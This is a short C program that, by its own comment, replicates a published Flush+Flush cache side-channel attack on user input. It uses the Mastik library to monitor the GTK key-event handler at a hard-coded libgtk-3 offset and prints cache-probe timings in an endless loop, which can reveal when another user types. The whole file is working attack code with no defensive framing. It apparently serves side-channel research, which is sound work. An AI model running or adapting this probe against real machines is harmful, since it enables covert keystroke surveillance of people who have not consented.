/* Flush+Flush */
/* Tries to replicate the "Side-Channel Attack on User Input" from the orginal paper */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mastik/symbol.h>
#include <mastik/ff.h>
#include <mastik/util.h>


int main(int ac, char **av) {
  /* gtk_window_propagate_key_event */
  void *ptr = map_offset("/usr/lib/x86_64-linux-gnu/libgtk-3.so.0.2404.16", 0x3b3270);
  if (ptr == NULL)
    exit(0);

  ff_t ff = ff_prepare();
  ff_monitor(ff, ptr);

  uint16_t res[1];
  ff_probe(ff, res);

  int lines=0;
  for (;;) {
    ff_probe(ff, res);
  
    printf("%u\n", res[0]);

    delayloop(10000);
  }
}
